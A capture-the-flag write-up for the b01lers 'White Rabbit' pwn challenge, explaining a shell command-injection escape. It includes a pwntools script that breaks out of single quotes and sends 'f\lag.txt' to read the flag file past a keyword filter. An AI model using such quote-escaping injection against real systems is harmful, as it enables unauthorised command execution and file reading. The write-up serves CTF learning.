## b01lers bootcamp: White Rabbit [pwn]
![](rabbit_description.png)

#### The challenge was a terminal escape, basically the constraints of the challenge are that we cannot input anything that contains the string 'flag' and our input is executed by system once with the following command `[ -f our_input] && cat 'our_input' || echo File does not exist`.

#### Although I have little experience with sandbox/terminal/python jail escape types of challenges, this one was pretty simple. Since our input is wrapped around single apostrophes, we can just escape these and provide an escaped flag.txt string so that the program does not detect the exact flag string. The exploit, which I tested locally first will result to `cat '' f\lag.txt ''` which prints out the flag for us.

```python
from pwn import *

#:
p = remote('chal.ctf.b01lers.com', 1013)
#p = process('./whiterabbit')
print(p.recv())

p.sendline("'f\lag.txt'")
print(p.recv())

#: flag{Th3_BuNNy_wabbit_l3d_y0u_h3r3_4_a_reason}
```